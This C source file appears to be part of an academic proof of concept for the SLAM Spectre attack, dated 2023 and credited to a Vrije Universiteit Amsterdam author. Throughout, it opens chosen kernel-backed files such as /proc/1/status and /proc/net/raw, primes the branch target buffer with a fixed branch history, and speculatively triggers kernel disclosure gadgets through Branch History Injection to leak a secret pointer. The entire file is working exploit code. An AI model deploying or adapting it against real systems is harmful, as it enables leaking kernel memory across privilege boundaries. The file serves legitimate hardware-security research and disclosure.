/* Spectre disclosure gadget triggering functionality.
 *
 * Date: November 23, 2023
 * Author: Mathé Hertogh - Vrije Universiteit Amsterdam
 */

#include "slam.h"

FILE *ideal_gadget;
static int gadget_fd = 0;

static void gadget_fd_open()
{
#ifdef CGROUP_SEQFILE_SHOW
	gadget_fd = open("/sys/fs/cgroup/user.slice/cpu.idle", O_RDONLY, 0);
#endif
#ifdef EXT4_FILE_WRITE_ITER
	gadget_fd = open("gadget.txt", O_CREAT, S_IRUSR|S_IWUSR|S_IROTH|S_IWOTH);
#endif
#ifdef HUGETLBFS_READ_ITER
	/* The file below must exist with the correct permissions, /mnt/huge
	 * must be backed by a hugetlbfs file system, and there must be
	 * hugepages available (cf. /proc/sys/vm/nr_hugepages).
	 */
	gadget_fd = open("/mnt/huge/gadget.txt", O_RDONLY, 0);
#endif
#if defined KERNFS_SEQ_SHOW || defined KERNFS_FOP_READ_ITER
	gadget_fd = open("/sys/devices/system/cpu/uevent", O_RDONLY, 0);
#endif
#ifdef PROC_SIGNLE_SHOW
	gadget_fd = open("/proc/1/status", O_RDONLY, 0);
#endif
#ifdef RAW_SEQ_START
	gadget_fd = open("/proc/net/raw", O_RDONLY, 0);
#endif
#ifdef SEL_READ_MLS
	gadget_fd = open("/sys/fs/selinux/mls", O_RDONLY, 0);
#endif
	if (gadget_fd < 0)
		fail("can not open target syscall file");
}

static void gadget_trigger_ideal(void *secret_ptr)
{
	int len, count;
	char address[20];
	memset(address, 0, 20);
	len = snprintf(address, 20, "%p\n", secret_ptr);
	count = fwrite(address, 1, len, ideal_gadget);
	if (count != len)
		fail("trigger gadget fwrite problem");
	fflush(ideal_gadget);
}

/* Reach the gadget architecturally via an indirect branch. This inserts the
 * gadget into the BTB, enabling misprediction to the gadget. We make sure that
 * we reach the gadget with a constant history (all 1s), to get reproducible BHB
 * collisions.
 */
static void gadget_reach()
{
	// Dump sytem call data here and ignore it.
	char buf[32];

#ifdef EXT4_FILE_OPEN
	int fd = clear_bhb_call(open, (uint64_t)"gadget.txt", O_CREAT, S_IRUSR|S_IWUSR, 0);
	if (close(fd) < 0)
		fail("failed closing gadget.txt's fd");
	fd = clear_bhb_call(open, (uint64_t)"gadget.txt", O_CREAT, S_IRUSR|S_IWUSR, 0);
	if (close(fd) < 0)
		fail("failed closing gadget.txt's fd");
#endif
#ifdef EXT4_FILE_WRITE_ITER
	clear_bhb_call(pwrite, gadget_fd, (uint64_t)buf, 32, 0);
	clear_bhb_call(pwrite, gadget_fd, (uint64_t)buf, 32, 0);
#endif
#if (defined CGROUP_SEQFILE_SHOW || defined HUGETLBFS_READ_ITER || defined KERNFS_SEQ_SHOW || defined KERNFS_FOP_READ_ITER \
		|| defined PROC_SIGNLE_SHOW || defined RAW_SEQ_START || defined SEL_READ_MLS)
	clear_bhb_call(pread, gadget_fd, (uint64_t)buf, 32, 0);
	clear_bhb_call(pread, gadget_fd, (uint64_t)buf, 32, 0); // TODO don't need it twice right?
#endif
#ifdef SHMEM_FAULT
	void *p = mmap(NULL, PAGE_SIZE, PROT_RW, MAP_SHARED|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
	munmap(p, PAGE_SIZE);
	p = mmap(NULL, PAGE_SIZE, PROT_RW, MAP_SHARED|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
	munmap(p, PAGE_SIZE);
#endif
#ifdef SHMEM_STATFS
	struct statfs r;
	statfs("/dev/shm", &r);
	statfs("/dev/shm", &r);
#endif
}

static void gadget_init_ideal()
{
	ideal_gadget = fopen("/proc/kslam/gadget_lam","w");
	if (!ideal_gadget)
		fail("failed to open ideal gadget sysfs file");
}

void gadget_init(uint64_t direct_map)
{
#ifdef IDEAL
        gadget_init_ideal();
#else
	gadget_fd_open();
	bhi_init(direct_map);
#endif
}

const char *gadget_name()
{
#ifdef IDEAL
	return "ideal";
#endif
#ifdef CGROUP_SEQFILE_SHOW
	return "cgroup_seqfile_show";
#endif
#ifdef EXT4_FILE_OPEN
	return "ext4_file_open";
#endif
#ifdef EXT4_FILE_WRITE_ITER
	return "ext4_file_write_iter";
#endif
#ifdef HUGETLBFS_READ_ITER
	return "hugetlbfs_read_iter";
#endif
#ifdef KERNFS_FOP_READ_ITER
	return "kernfs_fop_read_iter";
#endif
#ifdef KERNFS_SEQ_SHOW
	return "kernfs_seq_show";
#endif
#ifdef PROC_SIGNLE_SHOW
	return "proc_single_show";
#endif
#ifdef RAW_SEQ_START
	return "raw_seq_start";
#endif
#ifdef SEL_READ_MLS
	return "sel_read_mls";
#endif
#ifdef SHMEM_FAULT
	return "shmem_fault";
#endif
#ifdef SHMEM_STATFS
	return "shmem_statfs";
#endif
}

void gadget_trigger(void *secret_ptr)
{
#ifdef IDEAL
	gadget_trigger_ideal(secret_ptr);
#else

	// This seems to enhance/stabilize the signal.
	volatile char dummy;
	for (int i = 0; i < 47; i++)
		for (int j = 0; j < 53; j++)
			dummy = 0;

	// Insert our gadget into the BTB.
	gadget_reach();

	// Trigger the gadget speculatively with malicious input using BHI.
	bhi_trigger_gadget(secret_ptr);
#endif
}
